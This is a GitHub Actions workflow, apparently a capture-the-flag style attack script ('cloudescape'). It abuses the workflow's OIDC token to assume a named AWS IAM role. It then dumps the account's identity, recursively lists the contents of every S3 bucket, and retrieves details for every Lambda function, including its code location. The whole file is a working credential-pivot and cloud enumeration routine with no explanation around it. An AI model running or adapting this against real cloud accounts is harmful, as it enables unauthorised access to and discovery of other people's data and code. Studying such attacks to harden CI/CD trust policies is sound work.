name: corgi-assume
on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  dump:
    runs-on: self-hosted
    steps:
      - name: Install AWS CLI
        run: |
          if ! command -v aws >/dev/null 2>&1; then
            curl -sSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o /tmp/awscliv2.zip
            sudo apt-get update -y && sudo apt-get install -y unzip || true
            unzip -q /tmp/awscliv2.zip -d /tmp
            sudo /tmp/aws/install || sudo /tmp/aws/install --update
          fi
          aws --version

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: cloudescape-corgi

      - name: Enumerate
        run: |
          set -e
          aws sts get-caller-identity | tee /tmp/id.json
          echo "=== S3 buckets ==="
          aws s3api list-buckets --output json | tee /tmp/buckets.json || true
          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
            echo "==== BUCKET $b ===="
            aws s3 ls "s3://$b" --recursive || true
          done
          echo "=== Lambda ==="
          aws lambda list-functions --output json | tee /tmp/lambda.json || true
          for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null); do
            echo "==== FN $fn ===="
            aws lambda get-function --function-name "$fn" || true
          done